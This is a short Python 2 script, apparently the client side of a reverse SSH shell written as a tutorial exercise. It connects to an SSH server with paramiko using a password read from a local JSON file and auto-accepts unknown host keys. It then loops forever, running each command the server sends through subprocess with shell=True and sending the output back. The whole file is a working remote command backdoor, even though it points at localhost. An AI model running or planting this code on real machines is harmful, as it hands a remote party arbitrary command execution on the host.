#!/usr/bin/python
import os
import paramiko
import subprocess
import json


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()

    if os.path.exists("~/.ssh/known_hosts"):
        client.load_host_keys('~/.ssh/known_hosts')

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        print ssh_session.recv(1024)

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_session.send(str(e))

        client.close()

    return


# requires a JSON file in the same directory with format:
# { passwords: { "<user>": "<password>" } }

password = ""

if os.path.exists('resources/passwords.json'):
    json_data = open('resources/passwords.json')
    data = json.load(json_data)
    password = data["passwords"]["yiannisk"]
    json_data.close()


ssh_command("127.0.0.1", 9999, "yiannisk", password, "ClientConnected")
